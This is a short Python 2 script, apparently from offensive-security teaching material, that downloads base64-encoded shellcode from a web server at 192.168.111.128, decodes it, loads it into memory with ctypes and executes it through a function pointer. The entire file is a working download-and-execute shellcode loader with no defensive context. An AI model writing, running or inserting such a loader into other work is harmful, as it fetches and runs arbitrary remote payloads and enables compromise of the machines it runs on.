import urllib2
import ctypes
import base64
# retrieve the shellcode from our web server
url = "http://192.168.111.128/sh.yx"
response = urllib2.urlopen(url)

# decode the shellcode from base64
shellcode = base64.b64decode(response.read())
print type(shellcode)
print len(shellcode)

shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

#create a function pointer to our shellcode
shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

# start the shellcode
shellcode_func()

